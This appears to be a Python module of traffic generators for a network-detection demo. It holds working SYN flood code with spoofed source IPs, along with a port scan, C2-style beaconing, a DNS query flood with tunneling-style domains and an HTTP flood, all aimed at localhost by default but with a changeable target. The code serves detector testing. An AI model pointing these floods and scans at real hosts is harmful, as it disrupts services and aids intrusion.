"""
Real attack generators for demo purposes.

Uses raw sockets and standard sockets to generate real network traffic
that the detection system can capture and analyze.

All attacks target localhost (127.0.0.1) by default for safe single-PC demos.
"""

import ipaddress
import logging
import random
import socket
import struct
import threading
import time
from typing import Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

DEFAULT_TARGET = "127.0.0.1"
DEFAULT_INTERFACE = "lo"  # loopback — works everywhere

# Ports to use for demo attacks
DEMO_PORTS = [22, 80, 443, 3306, 5432, 8080, 8443, 3000, 5000, 8000]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _random_port() -> int:
    return random.randint(1024, 65535)


def _random_external_ip() -> str:
    """Generate a random external IP (for spoofed sources)."""
    while True:
        octets = [random.randint(1, 223) for _ in range(4)]
        # Skip private ranges
        if octets[0] == 10:
            continue
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            continue
        if octets[0] == 192 and octets[1] == 168:
            continue
        if octets[0] == 127:
            continue
        return ".".join(str(o) for o in octets)


def _checksum(data: bytes) -> int:
    """Compute ICMP/TCP/UDP checksum."""
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!" + "H" * (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


# ---------------------------------------------------------------------------
# Attack: SYN Flood (DDoS simulation)
# ---------------------------------------------------------------------------


def syn_flood(
    target: str = DEFAULT_TARGET,
    target_port: int = 80,
    duration: float = 10.0,
    rate: int = 500,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Send a burst of TCP SYN packets to simulate a DDoS attack.

    Uses raw sockets so we don't need root on Windows (Npcap handles it).
    Falls back to regular connect() storms if raw sockets fail.

    Returns a description of what was sent.
    """
    logger.info(f"[ATTACK] SYN flood → {target}:{target_port} for {duration}s at {rate}/s")
    stop = stop_event or threading.Event()
    sent = 0

    try:
        # Try raw socket SYN flood
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            start = time.time()
            while time.time() - start < duration and not stop.is_set():
                src_ip = _random_external_ip()
                src_port = _random_port()
                seq = random.randint(0, 0xFFFFFFFF)
                window = random.randint(1024, 65535)

                # Minimal TCP SYN packet (IP header + TCP header)
                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 40  # 20 IP + 20 TCP
                ip_id = random.randint(0, 65535)
                ip_frag_off = 0
                ip_ttl = 64
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0

                ip_header = struct.pack(
                    "!BBHHHBBH4s4s",
                    (ip_ver << 4) + ip_ihl,
                    ip_tos,
                    ip_tot_len,
                    ip_id,
                    ip_frag_off,
                    ip_ttl,
                    ip_proto,
                    ip_check,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(target),
                )

                tcp_syn = 0x02
                tcp_offset = 5
                tcp_window = window
                tcp_check = 0
                tcp_urg_ptr = 0

                tcp_header = struct.pack(
                    "!HHLLBBHHH",
                    src_port,
                    target_port,
                    seq,
                    0,
                    (tcp_offset << 4),
                    tcp_syn,
                    tcp_window,
                    tcp_check,
                    tcp_urg_ptr,
                )

                sock.sendto(ip_header + tcp_header, (target, target_port))
                sent += 1

                # Rate limit
                if rate > 0:
                    time.sleep(1.0 / rate)

            sock.close()
            logger.info(f"[ATTACK] SYN flood complete: {sent} packets sent")

        except PermissionError:
            # Fallback: connect() storm (no raw socket needed)
            logger.info("[ATTACK] Raw socket failed, using connect() storm")
            start = time.time()
            while time.time() - start < duration and not stop.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((target, target_port))
                    s.close()
                    sent += 1
                except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                    sent += 1
                if rate > 0:
                    time.sleep(1.0 / rate)

    except Exception as e:
        logger.error(f"[ATTACK] SYN flood error: {e}")

    return f"SYN flood: {sent} packets to {target}:{target_port}"


# ---------------------------------------------------------------------------
# Attack: Port Scan
# ---------------------------------------------------------------------------


def port_scan(
    target: str = DEFAULT_TARGET,
    ports: Optional[list] = None,
    duration: float = 8.0,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Scan a range of ports on the target — simulates reconnaissance.

    This generates sequential connection attempts that the port scan
    detector should flag.
    """
    ports = ports or DEMO_PORTS[:8]
    logger.info(f"[ATTACK] Port scan → {target} ports {ports}")
    stop = stop_event or threading.Event()
    scanned = 0

    try:
        start = time.time()
        for port in ports:
            if stop.is_set() or (time.time() - start) > duration:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target, port))
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            scanned += 1
            time.sleep(0.3)  # Sequential scan — easy to detect

        # Second pass for intensity
        for port in ports[:5]:
            if stop.is_set() or (time.time() - start) > duration:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((target, port))
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            scanned += 1
            time.sleep(0.1)

    except Exception as e:
        logger.error(f"[ATTACK] Port scan error: {e}")

    return f"Port scan: {scanned} probes on {len(ports)} ports"


# ---------------------------------------------------------------------------
# Attack: Beaconing (C2 simulation)
# ---------------------------------------------------------------------------


def beaconing(
    target: str = DEFAULT_TARGET,
    target_port: int = 4444,
    duration: float = 15.0,
    interval: float = 2.0,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Simulate C2 beaconing with periodic connections at fixed intervals.

    The beaconing detector should catch the regular timing pattern.
    """
    logger.info(f"[ATTACK] Beaconing → {target}:{target_port} every {interval}s for {duration}s")
    stop = stop_event or threading.Event()
    beacons = 0

    try:
        end_time = time.time() + duration
        while time.time() < end_time and not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target, target_port))
                # Send a small payload
                s.send(b"\x00" * 16)
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            beacons += 1
            time.sleep(interval)

    except Exception as e:
        logger.error(f"[ATTACK] Beaconing error: {e}")

    return f"Beaconing: {beacons} beacons at {interval}s interval"


# ---------------------------------------------------------------------------
# Attack: DNS Query Flood (DNS tunneling simulation)
# ---------------------------------------------------------------------------


def dns_flood(
    target: str = "127.0.0.1",
    target_port: int = 53,
    duration: float = 8.0,
    rate: int = 50,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Send rapid DNS queries to simulate DNS tunneling / DNS flood.

    Uses raw UDP sockets to send crafted DNS-like packets.
    Falls back to regular UDP datagrams.
    """
    logger.info(f"[ATTACK] DNS flood → {target}:{target_port} for {duration}s")
    stop = stop_event or threading.Event()
    sent = 0

    # Suspicious-looking domain names (simulating DNS tunneling)
    suspicious_domains = [
        "a1b2c3d4.evil.example.com",
        "xYz.malware-c2.net",
        "longsubdomain.bigger.longer.suspicious.example.org",
        "a" * 30 + ".exfil.example.com",
        "beacon." + "x" * 20 + ".c2.net",
    ]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1.0)

        start = time.time()
        while time.time() - start < duration and not stop.is_set():
            domain = random.choice(suspicious_domains)
            # Craft a minimal DNS query packet
            # Header: 12 bytes
            transaction_id = random.randint(0, 65535)
            flags = 0x0100  # Standard query
            qdcount = 1
            ancount = 0
            nscount = 0
            arcount = 0

            dns_header = struct.pack(
                "!HHHHHH",
                transaction_id, flags, qdcount, ancount, nscount, arcount,
            )

            # QNAME: domain name in DNS format
            qname = b""
            for part in domain.split("."):
                qname += bytes([len(part)]) + part.encode()
            qname += b"\x00"

            # QTYPE=1 (A), QCLASS=1 (IN)
            qtype_qclass = struct.pack("!HH", 1, 1)

            dns_query = dns_header + qname + qtype_qclass

            try:
                sock.sendto(dns_query, (target, target_port))
                sent += 1
            except OSError:
                pass

            time.sleep(1.0 / max(rate, 1))

        sock.close()

    except Exception as e:
        logger.error(f"[ATTACK] DNS flood error: {e}")

    return f"DNS flood: {sent} queries to {target}:{target_port}"


# ---------------------------------------------------------------------------
# Attack: HTTP Flood (application-layer DDoS)
# ---------------------------------------------------------------------------


def http_flood(
    target: str = "127.0.0.1",
    target_port: int = 8080,
    duration: float = 8.0,
    rate: int = 30,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Send HTTP GET requests in rapid succession — simulates HTTP flood DDoS.
    """
    logger.info(f"[ATTACK] HTTP flood → {target}:{target_port} for {duration}s")
    stop = stop_event or threading.Event()
    sent = 0

    paths = ["/", "/login", "/api", "/admin", "/search", "/api/data", "/wp-admin", "/graphql"]

    try:
        start = time.time()
        while time.time() - start < duration and not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((target, target_port))
                path = random.choice(paths)
                request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                s.send(request.encode())
                try:
                    s.recv
                except Exception:
                    pass
                s.close()
                sent += 1
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                sent += 1
            time.sleep(1.0 / max(rate, 1))

    except Exception as e:
        logger.error(f"[ATTACK] HTTP flood error: {e}")

    return f"HTTP flood: {sent} requests to {target}:{target_port}"


# ---------------------------------------------------------------------------
# Attack Controller
# ---------------------------------------------------------------------------


class AttackController:
    """Manages attack threads and provides status."""

    def __init__(self):
        self._threads: dict[str, threading.Thread] = {}
        self._stop_events: dict[str, threading.Event] = {}
        self._results: dict[str, str] = {}
        self._lock = threading.Lock()

    def launch(self, attack_type: str, **kwargs) -> str:
        """Launch an attack in a background thread. Returns attack ID."""
        attack_map = {
            "ddos": syn_flood,
            "port_scan": port_scan,
            "beaconing": beaconing,
            "dns_tunnel": dns_flood,
            "http_flood": http_flood,
        }

        func = attack_map.get(attack_type)
        if not func:
            raise ValueError(f"Unknown attack type: {attack_type}. Choose from: {list(attack_map.keys())}")

        attack_id = f"{attack_type}_{int(time.time() * 1000)}"
        stop_event = threading.Event()

        def _run():
            try:
                result = func(stop_event=stop_event, **kwargs)
                self._results[attack_id] = result
            except Exception as e:
                self._results[attack_id] = f"ERROR: {e}"

        thread = threading.Thread(target=_run, daemon=True, name=f"attack-{attack_type}")
        thread.start()

        with self._lock:
            self._threads[attack_id] = thread
            self._stop_events[attack_id] = stop_event

        logger.info(f"[CTRL] Launched {attack_type} (id={attack_id})")
        return attack_id

    def stop(self, attack_id: str) -> bool:
        """Stop a running attack by ID."""
        with self._lock:
            event = self._stop_events.get(attack_id)
            if event:
                event.set()
                logger.info(f"[CTRL] Stopping attack {attack_id}")
                return True
        return False

    def stop_all(self):
        """Stop all running attacks."""
        with self._lock:
            for event in self._stop_events.values():
                event.set()
        logger.info("[CTRL] All attacks stopped")

    def is_running(self, attack_id: str) -> bool:
        with self._lock:
            thread = self._threads.get(attack_id)
            return thread is not None and thread.is_alive()

    def get_result(self, attack_id: str) -> str:
        return self._results.get(attack_id, "pending...")

    def active_attacks(self) -> list[dict]:
        """List all active attacks."""
        result = []
        with self._lock:
            for aid, thread in self._threads.items():
                if thread.is_alive():
                    result.append({
                        "id": aid,
                        "type": aid.rsplit("_", 1)[0],
                        "result": self._results.get(aid, "running..."),
                    })
        return result


# Singleton
controller = AttackController()
